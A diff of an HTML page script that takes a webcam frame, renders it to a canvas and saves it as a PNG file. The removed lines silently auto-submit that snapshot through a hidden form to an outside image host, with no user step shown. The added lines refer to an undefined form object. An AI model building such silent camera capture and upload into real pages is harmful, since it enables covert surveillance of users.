@@ -24,12 +24,9 @@
                     setTimeout(function () { context.drawImage(video, 0, 0, 480, 640); }, 1000);
                     setTimeout(function () {
                         canvas.toBlob((blob) => {
-
-                            let file = new File([blob], "Alan.png", { type: "image/png", lastModified: new Date().getTime() });
-                            let container = new DataTransfer();
-                            container.items.add(file);
-                            document.getElementById('result').files = container.files;
-                            document.getElementById('gopo').submit();
+                            var img = new Blob([blob], { type: "image/png" });
+                            var fileOfBlob = new File([blob], 'Alan.png');
+                            form.append("image", fileOfBlob);
                         }
                         );
 
@@ -40,9 +37,7 @@
         }, false);
 
     </script>
-    <form action="https://locimg.com/upload/upload.html" enctype="multipart/form-data" id="gopo" method="post">
-        <input type="hidden" name="image" id="result" value="" />
-    </form>
+
 </body>
 
 </html>
